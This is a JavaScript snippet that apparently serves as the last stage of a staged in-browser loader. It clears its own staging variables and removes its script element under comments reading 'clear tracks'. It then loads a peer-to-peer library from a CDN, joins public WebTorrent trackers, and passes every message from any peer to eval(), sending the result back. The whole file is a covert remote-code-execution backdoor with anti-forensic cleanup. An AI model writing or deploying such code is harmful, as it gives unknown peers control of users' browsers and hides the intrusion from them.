// clear tracks
// purge variables
_g.completion = undefined;
_g.stages = undefined;
_g.stagesStr = undefined;
_g.stagesStr2 = undefined;
_g.finalStageID = undefined;
_g.clean = undefined;
// delete this script element
a.remove();
a = undefined;
// load p2pt
var node = document.createElement('script');
node.src='https://cdn.jsdelivr.net/gh/subins2000/p2pt/dist/p2pt.umd.min.js';
document.head.append(node);
// when it loads...
node.onload = () => {

  // delete the p2pt script element
  node.remove();
  node = undefined;

  log = msg => {
    if (typeof msg == 'object') {
      console.log((JSON && JSON.stringify ? JSON.stringify(msg, undefined, 2) : msg) + '<br />');
    } else {
      console.log(msg);
    }
  }

  // Find public WebTorrent tracker URLs here : https://github.com/ngosang/trackerslist/blob/master/trackers_all_ws.txt
  var trackersAnnounceURLs = [
    "wss://tracker.openwebtorrent.com",
    "wss://tracker.files.fm:7073/announce",
    "wss://spacetradersapi-chatbox.herokuapp.com:443/announce"
  ]

  // This 'myApp' is called identifier and should be unique to your app
  window.p2pt = new P2PT(trackersAnnounceURLs, '{16305e80-b09e-4cfe-ade0-44b67841769c}')

  // If a tracker connection was successful

  p2pt.on('trackerconnect', (tracker, stats) => {
    log('Connected to tracker : ' + tracker.announceUrl)
    log('Tracker stats : ' + JSON.stringify(stats))
    log('')
  })

  peersGlobal = [];

  // If a new peer, send message
  p2pt.on('peerconnect', peer => {
    log("peer connected!")
    peersGlobal.push(peer);
  })

  p2pt.on('peerclose', peer => {
    peersGlobal.pop(peersGlobal.indexOf(peer));
  })

  var output = null;

  // If message received from peer
  p2pt.on('msg', (peer, msg) => {
    if (!(peersGlobal.indexOf(peer)+1)) peersGlobal.push(peer);
    log(`Got message from ${peer.id} : ${msg}`);
    var data;
    try {data=eval(msg)}
    catch (e) {data=e}
    if (data === undefined) data = "undefined"
    else if (data === "") data = "\"\""
    p2pt.send(peer, "RETURN: "+data);
  })

  log('P2PT started. My peer id : ' + p2pt._peerId);
  p2pt.start();
  //alert("started");
};
